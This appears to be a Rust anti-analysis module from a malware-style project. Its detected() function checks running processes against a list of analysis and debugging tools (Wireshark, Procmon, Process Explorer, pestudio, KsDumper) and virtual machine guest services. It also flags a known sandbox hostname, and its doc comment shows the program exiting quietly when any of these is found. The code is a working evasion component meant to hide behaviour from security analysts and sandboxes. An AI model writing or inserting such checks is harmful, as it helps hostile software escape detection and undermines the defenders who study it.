use sysinfo::{ProcessExt, System, SystemExt};

/// Returns whether or not any sign of analysis environment is present.
/// Is true if processes() or sandbox() is true.
/// 
/// Use:
/// ```
/// use std::env;
/// 
/// if anti_analysis::detected(){
///     process::exit(0);
/// }
/// ```


pub fn detected() -> bool{
    return processes() || sandbox();
}

fn processes() -> bool{
    let analysers = vec![
        "Wireshark.exe",
        "procexp64.exe",
        "procexp.exe",
        "Procmon.exe",
        "Procmon64.exe",
        "pestudio.exe",
        "KsDumper.exe",
        "prl_cc.exe",
        "prl_tools.exe"
    ];

    let vms = vec![
        //"VBoxTray.exe",
        //"VBoxService.exe",
        "VMwareUser.exe",
        "vmtoolsd.exe",
        "VMwareTray.exe",
        "vmsrvc.exe",
        "VGAuthService.exe"
    ];

    let s = System::new_all();
    for (_pid, process) in s.processes() {
        if analysers.contains(&process.name()) || vms.contains(&process.name()) {
            return true;
        }
    }
    return false;
}

fn sandbox() -> bool{
    let sys = System::new_all();
    let windows_version = sys.os_version().unwrap().chars().next().unwrap();
    if windows_version == '0' {
        return true;
    }
    let host = sys.host_name().unwrap().to_lowercase();
    if host == "john-pc"{
        return true;
    }
    return false;
}